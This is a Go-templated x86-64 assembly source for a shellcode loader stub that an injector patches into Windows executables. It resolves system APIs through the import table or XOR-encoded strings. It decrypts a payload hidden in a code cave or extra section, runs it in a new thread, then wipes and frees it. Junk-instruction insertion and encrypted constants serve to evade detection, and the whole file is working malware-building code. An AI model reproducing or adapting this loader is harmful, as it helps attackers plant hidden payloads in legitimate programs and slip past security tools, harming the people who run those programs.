.code64

// rdi store address of ImageBaseAddress
// rsi store address of kernel32.dll
// rbx store address of LoadLibrary
// rbp store address of GetProcAddress
// [rsp+0x10] store address of VirtualAlloc
// [rsp+0x18] store address of VirtualFree
// [rsp+0x20] store address of VirtualProtect
// [rsp+0x28] store address of CreateThread
// [rsp+0x30] store address of WaitForSingleObject
// [rsp+0x38] store address of allocated memory page
// [rsp+0x40] store the last error
// 0x21082520 is a stub that will be replaced by injector

entry:
// ================================ prepare environment ================================

  // ensure stack is 16 bytes aligned
  push {{.RegN.rbp}}                                           {{iji}}
  mov {{.RegN.rbp}}, rsp                                       {{iji}}
  mov {{.RegV.rax}}, {{.RegN.rbp}}                             {{iji}}
  and {{.RegV.rax}}, 0x0F                                      {{iji}}
  sub rsp, {{.RegV.rax}}                                       {{iji}}
  push {{.RegN.rbp}}                                           {{iji}}

  // reserve stack for store variables
  sub rsp, 0x28                                                {{iji}}
  sub rsp, 0x30                                                {{iji}}

{{if .NeedSaveLastError}}
  // save the last error to stack
  xor {{.Reg.rax}}, {{.Reg.rax}}                               {{iji}}
  add {{.Reg.rax}}, 0x30                                       {{iji}}
  mov {{.Reg.rbx}}, gs:[{{.Reg.rax}}]                          {{iji}}
  mov {{.Reg.rcx}}, [{{.Reg.rbx}}+0x68]                        {{iji}}
  mov [rsp+0x40], {{.Reg.rcx}}                                 {{iji}}
{{end}}

// =============================== get procedure address ===============================

{{if .LackProcedure}}
  // push kernel32 module name to stack
  mov {{.Reg.rax}}, {{index .Kernel32DLLDB  0}}                {{iji}}
  mov {{.Reg.r8}},  {{index .Kernel32DLLKey 0}}                {{iji}}
  xor {{.Reg.rax}}, {{.Reg.r8}}                                {{iji}}
  push {{.Reg.rax}}                                            {{iji}}
  mov {{.Reg.rbx}}, {{index .Kernel32DLLDB  1}}                {{iji}}
  mov {{.Reg.r9}},  {{index .Kernel32DLLKey 1}}                {{iji}}
  xor {{.Reg.rbx}}, {{.Reg.r9}}                                {{iji}}
  push {{.Reg.rbx}}                                            {{iji}}

  {{if .LoadLibraryWOnly}}
    mov {{.Reg.rcx}}, {{index .Kernel32DLLDB  2}}              {{iji}}
    mov {{.Reg.r10}}, {{index .Kernel32DLLKey 2}}              {{iji}}
    xor {{.Reg.rcx}}, {{.Reg.r10}}                             {{iji}}
    push {{.Reg.rcx}}                                          {{iji}}
    mov {{.Reg.rdx}}, {{index .Kernel32DLLDB  3}}              {{iji}}
    mov {{.Reg.r11}}, {{index .Kernel32DLLKey 3}}              {{iji}}
    xor {{.Reg.rdx}}, {{.Reg.r11}}                             {{iji}}
    push {{.Reg.rdx}}                                          {{iji}}
  {{end}}

  // calculate image base address
  call get_rip
  mov {{.RegN.rdi}}, {{.Reg.rax}}
  sub {{.RegN.rdi}}, 0x21082520

  // read the LoadLibraryA/W form IAT
  mov {{.RegN.rbx}}, {{.RegN.rdi}}                             {{iji}}
  add {{.RegN.rbx}}, {{hex .LoadLibrary}}                      {{iji}}
  mov {{.RegN.rbx}}, [{{.RegN.rbx}}]                           {{iji}}

  // load kernel32.dll
  mov rcx, rsp         {{iji}} // lpLibFileName
  sub rsp, 0x20        {{iji}} // reserve stack for call convention
  call {{.RegN.rbx}}   {{iji}} // call LoadLibraryA/W
  add rsp, 0x20        {{iji}} // restore stack for call convention

  // store the handle of kernel32.dll
  mov {{.RegN.rsi}}, rax                                       {{iji}}

  // restore stack for kernel32 module name
  {{if .LoadLibraryWOnly}}
    add rsp, 4*8                                               {{iji}}
  {{else}}
    add rsp, 2*8                                               {{iji}}
  {{end}}

  // read the GetProcAddress form IAT
  mov {{.RegV.rax}}, {{.RegN.rdi}}                             {{iji}}
  add {{.RegV.rax}}, {{hex .GetProcAddress}}                   {{iji}}
  mov {{.RegN.rbp}}, [{{.RegV.rax}}]                           {{iji}}

  // get procedure address of VirtualAlloc
  {{if .LackVirtualAlloc}}
    // push procedure name to stack
    mov {{.RegV.rax}}, {{index .VirtualAllocDB  0}}            {{iji}}
    mov {{.RegV.r8}},  {{index .VirtualAllocKey 0}}            {{iji}}
    xor {{.RegV.rax}}, {{.RegV.r8}}                            {{iji}}
    push {{.RegV.rax}}                                         {{iji}}
    mov {{.RegV.rcx}}, {{index .VirtualAllocDB  1}}            {{iji}}
    mov {{.RegV.r9}},  {{index .VirtualAllocKey 1}}            {{iji}}
    xor {{.RegV.rcx}}, {{.RegV.r9}}                            {{iji}}
    push {{.RegV.rcx}}                                         {{iji}}
    mov rcx, {{.RegN.rsi}}     {{iji}} // hModule
    mov rdx, rsp               {{iji}} // lpProcName
    sub rsp, 0x20              {{iji}} // reserve stack for call convention
    call {{.RegN.rbp}}         {{iji}} // call GetProcAddress
    add rsp, 0x20              {{iji}} // restore stack for call convention
    // restore stack for procedure name
    add rsp, 2*8                                               {{iji}}
    // store procedure address to stack
    mov [rsp+0x10], rax                                        {{iji}}
  {{else}}
    mov {{.RegV.rcx}}, {{.RegN.rdi}}                           {{iji}}
    add {{.RegV.rcx}}, {{hex .VirtualAlloc}}                   {{iji}}
    mov {{.RegV.rcx}}, [{{.RegV.rcx}}]                         {{iji}}
    mov [rsp+0x10], {{.RegV.rcx}}                              {{iji}}
  {{end}}

  // get procedure address of VirtualFree
  {{if .NeedEraseShellcode}}
    {{if .LackVirtualFree}}
      // push procedure name to stack
      mov {{.RegV.rax}}, {{index .VirtualFreeDB  0}}           {{iji}}
      mov {{.RegV.r8}},  {{index .VirtualFreeKey 0}}           {{iji}}
      xor {{.RegV.rax}}, {{.RegV.r8}}                          {{iji}}
      push {{.RegV.rax}}                                       {{iji}}
      mov {{.RegV.rcx}}, {{index .VirtualFreeDB  1}}           {{iji}}
      mov {{.RegV.r9}},  {{index .VirtualFreeKey 1}}           {{iji}}
      xor {{.RegV.rcx}}, {{.RegV.r9}}                          {{iji}}
      push {{.RegV.rcx}}                                       {{iji}}
      mov rcx, {{.RegN.rsi}}   {{iji}} // hModule
      mov rdx, rsp             {{iji}} // lpProcName
      sub rsp, 0x20            {{iji}} // reserve stack for call convention
      call {{.RegN.rbp}}       {{iji}} // call GetProcAddress
      add rsp, 0x20            {{iji}} // restore stack for call convention
      // restore stack for procedure name
      add rsp, 2*8                                             {{iji}}
      // store procedure address to stack
      mov [rsp+0x18], rax                                      {{iji}}
    {{else}}
      mov {{.RegV.rcx}}, {{.RegN.rdi}}                         {{iji}}
      add {{.RegV.rcx}}, {{hex .VirtualFree}}                  {{iji}}
      mov {{.RegV.rcx}}, [{{.RegV.rcx}}]                       {{iji}}
      mov [rsp+0x18], {{.RegV.rcx}}                            {{iji}}
    {{end}}
  {{end}}

  // get procedure address of VirtualProtect
  {{if .LackVirtualProtect}}
    // push procedure name to stack
    mov {{.RegV.rax}}, {{index .VirtualProtectDB  0}}          {{iji}}
    mov {{.RegV.r8}},  {{index .VirtualProtectKey 0}}          {{iji}}
    xor {{.RegV.rax}}, {{.RegV.r8}}                            {{iji}}
    push {{.RegV.rax}}                                         {{iji}}
    mov {{.RegV.rcx}}, {{index .VirtualProtectDB  1}}          {{iji}}
    mov {{.RegV.r9}},  {{index .VirtualProtectKey 1}}          {{iji}}
    xor {{.RegV.rcx}}, {{.RegV.r9}}                            {{iji}}
    push {{.RegV.rcx}}                                         {{iji}}
    mov rcx, {{.RegN.rsi}}     {{iji}} // hModule
    mov rdx, rsp               {{iji}} // lpProcName
    sub rsp, 0x20              {{iji}} // reserve stack for call convention
    call {{.RegN.rbp}}         {{iji}} // call GetProcAddress
    add rsp, 0x20              {{iji}} // restore stack for call convention
    // restore stack for procedure name
    add rsp, 2*8                                               {{iji}}
    // store procedure address to stack
    mov [rsp+0x20], rax                                        {{iji}}
  {{else}}
    mov {{.RegV.rdx}}, {{.RegN.rdi}}                           {{iji}}
    add {{.RegV.rdx}}, {{hex .VirtualProtect}}                 {{iji}}
    mov {{.RegV.rdx}}, [{{.RegV.rdx}}]                         {{iji}}
    mov [rsp+0x20], {{.RegV.rdx}}                              {{iji}}
  {{end}}

  // get procedure address of CreateThread
  {{if .NeedCreateThread}}
    {{if .LackCreateThread}}
      // push procedure name to stack
      mov {{.RegV.rax}}, {{index .CreateThreadDB  0}}          {{iji}}
      mov {{.RegV.r8}},  {{index .CreateThreadKey 0}}          {{iji}}
      xor {{.RegV.rax}}, {{.RegV.r8}}                          {{iji}}
      push {{.RegV.rax}}                                       {{iji}}
      mov {{.RegV.rcx}}, {{index .CreateThreadDB  1}}          {{iji}}
      mov {{.RegV.r9}},  {{index .CreateThreadKey 1}}          {{iji}}
      xor {{.RegV.rcx}}, {{.RegV.r9}}                          {{iji}}
      push {{.RegV.rcx}}                                       {{iji}}
      mov rcx, {{.RegN.rsi}}   {{iji}} // hModule
      mov rdx, rsp             {{iji}} // lpProcName
      sub rsp, 0x20            {{iji}} // reserve stack for call convention
      call {{.RegN.rbp}}       {{iji}} // call GetProcAddress
      add rsp, 0x20            {{iji}} // restore stack for call convention
      // restore stack for procedure name
      add rsp, 2*8                                             {{iji}}
      // store procedure address to stack
      mov [rsp+0x28], rax                                      {{iji}}
    {{else}}
      mov {{.RegV.r8}}, {{.RegN.rdi}}                          {{iji}}
      add {{.RegV.r8}}, {{hex .CreateThread}}                  {{iji}}
      mov {{.RegV.r8}}, [{{.RegV.r8}}]                         {{iji}}
      mov [rsp+0x28], {{.RegV.r8}}                             {{iji}}
    {{end}}
  {{end}}

  // get procedure address of WaitForSingleObject
  {{if .NeedWaitThread}}
    {{if .LackWaitForSingleObject}}
      // push procedure name to stack
      mov {{.RegV.rax}}, {{index .WaitForSingleObjectDB  0}}   {{iji}}
      mov {{.RegV.r8}},  {{index .WaitForSingleObjectKey 0}}   {{iji}}
      xor {{.RegV.rax}}, {{.RegV.r8}}                          {{iji}}
      push {{.RegV.rax}}                                       {{iji}}
      mov {{.RegV.rcx}}, {{index .WaitForSingleObjectDB  1}}   {{iji}}
      mov {{.RegV.r9}},  {{index .WaitForSingleObjectKey 1}}   {{iji}}
      xor {{.RegV.rcx}}, {{.RegV.r9}}                          {{iji}}
      push {{.RegV.rcx}}                                       {{iji}}
      mov {{.RegV.rdx}}, {{index .WaitForSingleObjectDB  2}}   {{iji}}
      mov {{.RegV.r10}}, {{index .WaitForSingleObjectKey 2}}   {{iji}}
      xor {{.RegV.rdx}}, {{.RegV.r10}}                         {{iji}}
      push {{.RegV.rdx}}                                       {{iji}}
      mov rcx, {{.RegN.rsi}}   {{iji}} // hModule
      mov rdx, rsp             {{iji}} // lpProcName
      sub rsp, 0x28            {{iji}} // reserve stack for call convention
      call {{.RegN.rbp}}       {{iji}} // call GetProcAddress
      add rsp, 0x28            {{iji}} // restore stack for call convention
      // restore stack for procedure name
      add rsp, 3*8                                             {{iji}}
      // store procedure address to stack
      mov [rsp+0x30], rax                                      {{iji}}
    {{else}}
      mov {{.RegV.r9}}, {{.RegN.rdi}}                          {{iji}}
      add {{.RegV.r9}}, {{hex .WaitForSingleObject}}           {{iji}}
      mov {{.RegV.r9}}, [{{.RegV.r9}}]                         {{iji}}
      mov [rsp+0x30], {{.RegV.r9}}                             {{iji}}
    {{end}}
  {{end}}
{{else}}
  // calculate image base address
  call get_rip
  mov {{.RegN.rdi}}, {{.Reg.rax}}
  sub {{.RegN.rdi}}, 0x21082520
  // get procedure address of VirtualAlloc
  mov {{.RegV.rcx}}, {{.RegN.rdi}}                             {{iji}}
  add {{.RegV.rcx}}, {{hex .VirtualAlloc}}                     {{iji}}
  mov {{.RegV.rcx}}, [{{.RegV.rcx}}]                           {{iji}}
  mov [rsp+0x10], {{.RegV.rcx}}                                {{iji}}
  // get procedure address of VirtualFree
  {{if .NeedEraseShellcode}}
    mov {{.RegV.rcx}}, {{.RegN.rdi}}                           {{iji}}
    add {{.RegV.rcx}}, {{hex .VirtualFree}}                    {{iji}}
    mov {{.RegV.rcx}}, [{{.RegV.rcx}}]                         {{iji}}
    mov [rsp+0x18], {{.RegV.rcx}}                              {{iji}}
  {{end}}
  // get procedure address of VirtualProtect
  mov {{.RegV.rdx}}, {{.RegN.rdi}}                             {{iji}}
  add {{.RegV.rdx}}, {{hex .VirtualProtect}}                   {{iji}}
  mov {{.RegV.rdx}}, [{{.RegV.rdx}}]                           {{iji}}
  mov [rsp+0x20], {{.RegV.rdx}}                                {{iji}}
  // get procedure address of CreateThread
  {{if .NeedCreateThread}}
    mov {{.RegV.r8}}, {{.RegN.rdi}}                            {{iji}}
    add {{.RegV.r8}}, {{hex .CreateThread}}                    {{iji}}
    mov {{.RegV.r8}}, [{{.RegV.r8}}]                           {{iji}}
    mov [rsp+0x28], {{.RegV.r8}}                               {{iji}}
  {{end}}
  // get procedure address of WaitForSingleObject
  {{if .NeedWaitThread}}
    mov {{.RegV.r9}}, {{.RegN.rdi}}                            {{iji}}
    add {{.RegV.r9}}, {{hex .WaitForSingleObject}}             {{iji}}
    mov {{.RegV.r9}}, [{{.RegV.r9}}]                           {{iji}}
    mov [rsp+0x30], {{.RegV.r9}}                               {{iji}}
  {{end}}
{{end}} // LackProcedure

// ================================ prepare memory page ================================

  // allocate memory for shellcode
  mov rax, [rsp+0x10]                          {{iji}} // address of VirtualAlloc
  xor ecx, ecx                                 {{iji}} // lpAddress
  mov rdx, {{hex .MemRegionSize}}              {{iji}} // dwSize
  mov r8, {{hex .PAData.AllocationType}}       {{iji}} // flAllocationType MEM_RESERVE|MEM_COMMIT
  mov r10, {{hex .PAKey.AllocationType}}       {{iji}} // set decrypt key
  xor r8, r10                                  {{iji}} // decrypt argument
  mov r9, {{hex .PAData.Protect}}              {{iji}} // flProtect PAGE_READWRITE
  mov r11, {{hex .PAKey.Protect}}              {{iji}} // set decrypt key
  xor r9, r11                                  {{iji}} // decrypt argument
  sub rsp, 0x20                                {{iji}} // reserve stack for call convention
  call rax                                     {{iji}} // call VirtualAlloc
  add rsp, 0x20                                {{iji}} // restore stack for call convention

  // store allocated memory address
  mov [rsp+0x38], rax                          {{iji}}

  // padding garbage data to page
  mov {{.RegV.rdx}}, rax                       {{iji}}
  mov {{.RegV.rcx}}, {{hex .EntryOffset}}      {{iji}}
  // calculate a random seed from registers
  add {{.RegV.rax}}, rsp                       {{iji}}
  add {{.RegV.rax}}, {{.Reg.rbx}}              {{iji}}
  add {{.RegV.rax}}, {{.Reg.rcx}}              {{iji}}
  add {{.RegV.rax}}, {{.Reg.rdx}}              {{iji}}
  add {{.RegV.rax}}, {{.Reg.rsi}}              {{iji}}
  add {{.RegV.rax}}, {{.Reg.rdi}}              {{iji}}
  add {{.RegV.rax}}, {{.Reg.r8}}               {{iji}}
  add {{.RegV.rax}}, {{.Reg.r9}}               {{iji}}
  add {{.RegV.rax}}, {{.Reg.r10}}              {{iji}}
  add {{.RegV.rax}}, {{.Reg.r11}}              {{iji}}
 loop_padding:
  // it will waste some loop but clean code
  call xor_shift                               {{iji}}
  mov [{{.RegV.rdx}}], {{.RegV.rax}}           {{iji}}
  // check padding garbage is finish
  inc {{.RegV.rdx}}                            {{iji}}
  dec {{.RegV.rcx}}                            {{iji}}
  jnz loop_padding                             {{iji}}

// ================================= prepare shellcode =================================

{{if .CodeCaveMode}}
  // extract encrypted shellcode from code cave
  push {{.RegN.rdi}}                           {{iji}} // save "rdi" for execute shellcode
  mov {{.RegN.rbx}}, {{hex .PayloadKey}}       {{iji}} // key of encrypted shellcode
  mov {{.RegN.rdi}}, [rsp+0x08+0x38]           {{iji}} // address of allocated memory page
  add {{.RegN.rdi}}, {{hex .EntryOffset}}      {{iji}} // address of shellcode
  {{STUB CodeCaveMode STUB}}
  pop {{.RegN.rdi}}                            {{iji}} // restore "rdi" for execute shellcode
{{end}}

{{if or .CodeCaveNSMode .ExtendTextMode .ExtendTextNSMode .CreateTextMode}}
  // save rsi and rdi
  push rsi                                     {{iji}}
  push rdi                                     {{iji}}

  // extract encrypted shellcode from section
  mov rsi, {{.RegN.rdi}}                       {{iji}} // address of image base
  add rsi, {{hex .PayloadRVA}}                 {{iji}} // address of encrypted shellcode
  mov rdi, [rsp+0x10+0x38]                     {{iji}} // address of allocated memory page
  add rdi, {{hex .EntryOffset}}                {{iji}} // address of shellcode
  mov {{.RegV.rcx}}, {{hex .PayloadSize}}      {{iji}} // set loop times
 loop_extract:
  movsb                                        {{iji}}
  inc rsi                                      {{iji}}
  // check extract shellcode is finish
  dec {{.RegV.rcx}}                            {{iji}}
  jnz loop_extract                             {{iji}}

  // decrypt shellcode in the memory page
  mov {{.RegV.rax}}, {{hex .PayloadKey}}       {{iji}} // key of encrypted shellcode
  mov {{.RegV.rdx}}, [rsp+0x10+0x38]           {{iji}} // address of allocated memory page
  add {{.RegV.rdx}}, {{hex .EntryOffset}}      {{iji}} // address of shellcode
  mov {{.RegV.rcx}}, {{hex .PayloadSize}}      {{iji}} // set loop times
 loop_decrypt:
  mov {{.RegV.r8}}, [{{.RegV.rdx}}]            {{iji}}
  xor {{.RegV.r8}}, {{.RegV.rax}}              {{iji}}
  mov [{{.RegV.rdx}}], {{.RegV.r8}}            {{iji}}
  // update the key with xorshift64
  call xor_shift                               {{iji}}
  // check decrypt shellcode is finish
  add {{.RegV.rdx}}, 8                         {{iji}}
  sub {{.RegV.rcx}}, 8                         {{iji}}
  jnz loop_decrypt                             {{iji}}

  // restore rdi and rsi
  pop rdi                                      {{iji}}
  pop rsi                                      {{iji}}
{{end}}

// ================================== execute shellcode ==================================

  // adjust memory region protect before execute
  mov rax, [rsp+0x20]                          {{iji}} // address of VirtualProtect
  mov rcx, [rsp+0x38]                          {{iji}} // lpAddress
  sub rsp, 0x08                                {{iji}} // for store old protect
  mov rdx, {{hex .MemRegionSize}}              {{iji}} // dwSize
  mov r8, {{hex .PAData.NewProtect}}           {{iji}} // flNewProtect
  mov r10, {{hex .PAKey.NewProtect}}           {{iji}} // set decrypt key
  xor r8, r10                                  {{iji}} // decrypt argument
  mov r9, rsp                                  {{iji}} // lpflOldProtect
  sub rsp, 0x28                                {{iji}} // reserve stack for call convention
  call rax                                     {{iji}} // call VirtualProtect
  add rsp, 0x28                                {{iji}} // restore stack for call convention
  add rsp, 0x08                                {{iji}} // restore stack for old protect

{{if .NeedCreateThread}}
  {{if .NeedShellcodeJumper}}
    mov r10, {{.RegN.rdi}}                     {{iji}} // address of image base
    add r10, {{hex .JumperRVA}}                {{iji}} // address of shellcode jumper
    mov r11, [rsp+0x38]                        {{iji}} // address of memory page
    add r11, {{hex .EntryOffset}}              {{iji}} // address of shellcode
  {{else}}
    mov r10, [rsp+0x38]                        {{iji}} // address of memory page
    add r10, {{hex .EntryOffset}}              {{iji}} // address of shellcode
    xor r11d, r11d                             {{iji}} // clear register for lpParameter
  {{end}}

  mov rax, [rsp+0x28]                          {{iji}} // address of CreateThread
  sub rsp, 0x10                                {{iji}} // reserve stack for argument
  xor ecx, ecx                                 {{iji}} // lpThreadAttributes
  xor edx, edx                                 {{iji}} // dwStackSize
  mov r8, r10                                  {{iji}} // lpStartAddress
  mov r9, r11                                  {{iji}} // lpParameter
  mov [rsp+0], rcx                             {{iji}} // dwCreationFlags
  mov [rsp+8], rcx                             {{iji}} // lpThreadId
  sub rsp, 0x20                                {{iji}} // reserve stack for call convention
  call rax                                     {{iji}} // call CreateThread
  add rsp, 0x20                                {{iji}} // restore stack for call convention
  add rsp, 0x10                                {{iji}} // restore stack for argument

  {{if .NeedWaitThread}}
    mov rcx, rax                               {{iji}} // hHandle, hThread
    mov rdx, {{hex .PAData.Infinite}}          {{iji}} // dwMilliseconds, INFINITE
    mov r8, {{hex .PAKey.Infinite}}            {{iji}} // set decrypt key
    xor rdx, r8                                {{iji}} // decrypt argument
    mov rax, [rsp+0x30]                        {{iji}} // address of WaitForSingleObject
    sub rsp, 0x20                              {{iji}} // reserve stack for call convention
    call rax                                   {{iji}} // call WaitForSingleObject
    add rsp, 0x20                              {{iji}} // restore stack for call convention
  {{end}}
{{else}}
  mov {{.RegV.rax}}, [rsp+0x38]                {{iji}} // address of allocated memory
  add {{.RegV.rax}}, {{hex .EntryOffset}}      {{iji}} // address of shellcode
  sub rsp, 0x20                                {{iji}} // reserve stack for call convention
  call {{.RegV.rax}}                           {{iji}} // call shellcode
  add rsp, 0x20                                {{iji}} // restore stack for call convention
{{end}}

// =================================== erase shellcode ===================================

{{if .NeedEraseShellcode}}
  {{if not .UseRWXPage}}
    // adjust memory region protect before erase
    mov rax, [rsp+0x20]                        {{iji}} // address of VirtualProtect
    mov rcx, [rsp+0x38]                        {{iji}} // lpAddress
    sub rsp, 0x08                              {{iji}} // for store old protect
    mov rdx, {{hex .MemRegionSize}}            {{iji}} // dwSize
    mov r8, {{hex .PAData.Protect}}            {{iji}} // flNewProtect PAGE_READWRITE
    mov r10, {{hex .PAKey.Protect}}            {{iji}} // set decrypt key
    xor r8, r10                                {{iji}} // decrypt argument
    mov r9, rsp                                {{iji}} // lpflOldProtect
    sub rsp, 0x28                              {{iji}} // reserve stack for call convention
    call rax                                   {{iji}} // call VirtualProtect
    add rsp, 0x28                              {{iji}} // restore stack for call convention
    add rsp, 0x08                              {{iji}} // restore stack for old protect
  {{end}}

  // overwrite memory data
  mov {{.RegV.rdx}}, [rsp+0x38]                {{iji}} // address of memory page
  add {{.RegV.rdx}}, {{hex .EntryOffset}}      {{iji}} // address of shellcode
  mov {{.RegV.rcx}}, {{hex .PayloadSize}}      {{iji}} // set loop times
  sub {{.RegV.rcx}}, 7                         {{iji}} // adjust loop times
  // calculate a random seed from registers
  add {{.RegV.rax}}, rsp                       {{iji}}
  add {{.RegV.rax}}, {{.Reg.rbx}}              {{iji}}
  add {{.RegV.rax}}, {{.Reg.rcx}}              {{iji}}
  add {{.RegV.rax}}, {{.Reg.rdx}}              {{iji}}
  add {{.RegV.rax}}, {{.Reg.rsi}}              {{iji}}
  add {{.RegV.rax}}, {{.Reg.rdi}}              {{iji}}
  add {{.RegV.rax}}, {{.Reg.r8}}               {{iji}}
  add {{.RegV.rax}}, {{.Reg.r9}}               {{iji}}
  add {{.RegV.rax}}, {{.Reg.r10}}              {{iji}}
  add {{.RegV.rax}}, {{.Reg.r11}}              {{iji}}
 loop_erase:
  // it will waste some loop but clean code
  call xor_shift                               {{iji}}
  mov [{{.RegV.rdx}}], {{.RegV.rax}}           {{iji}}
  // check erase instruction is finish
  inc {{.RegV.rdx}}                            {{iji}}
  dec {{.RegV.rcx}}                            {{iji}}
  jnz loop_erase                               {{iji}}

  // release allocated memory page
  mov rax, [rsp+0x18]                          {{iji}} // address of VirtualFree
  mov rcx, [rsp+0x38]                          {{iji}} // address of allocated memory
  xor edx, edx                                 {{iji}} // dwSize
  mov r8, {{hex .PAData.FreeType}}             {{iji}} // dwFreeType MEM_RELEASE
  mov r9, {{hex .PAKey.FreeType}}              {{iji}} // set decrypt key
  xor r8, r9                                   {{iji}} // decrypt argument
  sub rsp, 0x20                                {{iji}} // reserve stack for call convention
  call rax                                     {{iji}} // call VirtualFree
  add rsp, 0x20                                {{iji}} // restore stack for call convention
{{end}}

// ================================== clean environment ==================================

{{if .NeedSaveLastError}}
  // store return value about VirtualFree
  push rax                                                     {{iji}}
  // restore the last error from stack
  xor {{.RegV.rax}}, {{.RegV.rax}}                             {{iji}}
  add {{.RegV.rax}}, 0x30                                      {{iji}}
  mov {{.RegV.rcx}}, gs:[{{.RegV.rax}}]                        {{iji}}
  mov {{.RegV.rdx}}, [rsp+0x40]                                {{iji}}
  mov [{{.RegV.rcx}}+0x68], {{.RegV.rdx}}                      {{iji}}
  // restore return value about VirtualFree
  pop rax                                                      {{iji}}
{{end}}

  // clear volatile register that store sensitive data
  xor {{.RegN.edi}}, {{.RegN.edi}}                             {{iji}}
  xor {{.RegN.esi}}, {{.RegN.esi}}                             {{iji}}
  xor {{.RegN.ebx}}, {{.RegN.ebx}}                             {{iji}}
  xor {{.RegN.ebp}}, {{.RegN.ebp}}                             {{iji}}

  // clear stack that store sensitive data
  mov [rsp+0x10], {{.RegN.rsi}}                                {{iji}}
  mov [rsp+0x18], {{.RegN.rbx}}                                {{iji}}
  mov [rsp+0x20], {{.RegN.rbp}}                                {{iji}}
  mov [rsp+0x28], {{.RegN.rdi}}                                {{iji}}
  mov [rsp+0x30], {{.RegN.rsi}}                                {{iji}}
  mov [rsp+0x38], {{.RegN.rdi}}                                {{iji}}
  mov [rsp+0x40], {{.RegN.rbx}}                                {{iji}}

  // restore stack for store variables
  add rsp, 0x30                                                {{iji}}
  add rsp, 0x28                                                {{iji}}

  // restore stack and rbp
  pop {{.RegN.rbp}}                                            {{iji}}
  mov rsp, {{.RegN.rbp}}                                       {{iji}}
  pop {{.RegN.rbp}}                                            {{iji}}

  // mark the end of loader
  {{db .EndOfLoader}}

// ====================================== function =======================================

get_rip:
  pop  {{.Reg.rax}}                                            {{iji}}
  push {{.Reg.rax}}                                            {{iji}}
  ret                                                          {{iji}}

xor_shift:
  mov {{.RegV.r8}}, {{.RegV.rax}}                              {{iji}}
  shl {{.RegV.r8}}, 13                                         {{iji}}
  xor {{.RegV.rax}}, {{.RegV.r8}}                              {{iji}}
  mov {{.RegV.r8}}, {{.RegV.rax}}                              {{iji}}
  shr {{.RegV.r8}}, 7                                          {{iji}}
  xor {{.RegV.rax}}, {{.RegV.r8}}                              {{iji}}
  mov {{.RegV.r8}}, {{.RegV.rax}}                              {{iji}}
  shl {{.RegV.r8}}, 17                                         {{iji}}
  xor {{.RegV.rax}}, {{.RegV.r8}}                              {{iji}}
  ret                                                          {{iji}}
